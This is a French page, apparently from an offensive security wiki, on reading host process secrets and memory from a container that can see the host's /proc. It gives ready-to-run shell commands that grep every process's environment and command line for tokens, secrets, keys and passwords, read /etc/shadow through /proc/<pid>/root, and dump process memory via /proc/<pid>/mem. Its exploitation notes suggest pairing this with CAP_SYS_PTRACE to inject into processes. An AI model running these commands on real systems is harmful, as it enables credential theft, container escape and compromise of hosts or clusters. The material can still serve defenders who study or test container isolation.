---
title: "Accès aux processus de l'hôte : lire la mémoire et les secrets de l'hôte via un proc monté"
order: 6
description: "Lorsque le /proc de l'hôte est visible dans un conteneur, via un montage bind ou un espace de noms PID partagé, tous les processus de l'hôte sont accessibles. Un attaquant lit les lignes de commande et les variables d'environnement à la recherche de secrets, suit /proc/pid/root vers les systèmes de fichiers d'autres conteneurs, et lit ou écrit /proc/pid/mem pour extraire des clés ou injecter dans un processus de l'hôte."
keywords:
  - host proc
  - proc pid mem
  - proc pid environ
  - espace de noms pid
  - évasion de conteneur
---

# Accès aux processus de l'hôte

`/proc` expose les internes de chaque processus que l'observateur peut voir. Lorsqu'un conteneur voit la table des processus de l'hôte, soit parce que le `/proc` de l'hôte est monté en bind, soit parce que le conteneur partage l'espace de noms PID de l'hôte (`--pid=host`, `hostPID: true`), toute la liste des processus de l'hôte devient lisible. Cela transforme `/proc` en une source abondante de secrets et en une voie vers d'autres processus : lignes de commande, variables d'environnement, descripteurs de fichiers ouverts, racine du processus et, avec les privilèges adéquats, mémoire des processus.

Confirmez que les processus de l'hôte sont visibles :

```bash
ls /proc | grep -E '^[0-9]+$' | wc -l         # many PIDs, including low host ones
readlink /proc/1/exe                           # host init (systemd) => host proc/namespace
ps aux | head                                  # host processes listed
```

## Voies

```bash
# Secrets in environment and command lines (tokens, DB creds, API keys)
for p in /proc/[0-9]*; do tr '\0' '\n' < $p/environ 2>/dev/null; done | \
  grep -iE 'token|secret|key|pass' | sort -u
cat /proc/[0-9]*/cmdline 2>/dev/null | tr '\0' ' '

# Follow a host process root into its filesystem (e.g. another container)
ls -la /proc/<pid>/root/                        # the target process's "/" as it sees it
cat /proc/<pid>/root/etc/shadow 2>/dev/null

# Open file descriptors can expose sockets, logs, and secret files held open
ls -l /proc/<pid>/fd/

# Read process memory directly (needs ptrace permission / CAP_SYS_PTRACE)
grep -F 'rw-p' /proc/<pid>/maps                 # writable regions and their ranges
dd if=/proc/<pid>/mem bs=1 skip=$((0xADDR)) count=256 2>/dev/null | xxd
```

`/proc/<pid>/root` est particulièrement utile : c'est un lien symbolique vers la racine du système de fichiers de ce processus, de sorte que si un processus de l'hôte ou un autre conteneur possède des fichiers que l'attaquant convoite, ils sont accessibles via ce chemin sans aucun montage propre.

## Notes d'exploitation

- Lire `environ`, `cmdline` et `fd` ne nécessite que la visibilité et généralement un UID identique ou privilégié ; c'est une pure étape de divulgation d'informations qui fournit fréquemment des jetons déverrouillant directement l'hôte ou le cluster.
- Lire ou écrire `/proc/<pid>/mem` pour un processus que vous ne possédez pas nécessite la permission ptrace, alors associez cela à [CAP_SYS_PTRACE](../../privileged-configuration/capability-abuse/cap-sys-ptrace.md) pour l'injection ; sans elle, les voies mémoire sont limitées à vos propres processus.
- Un espace de noms PID partagé seul (sans capacités supplémentaires) expose tout de même les `environ` et `root` des autres processus lorsque les UID correspondent, ce qui suffit souvent pour pivoter.

## Références

- [man 5 proc](https://man7.org/linux/man-pages/man5/proc.5.html)
- [HackTricks : hostPID and proc access](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security/namespaces/pid-namespace)
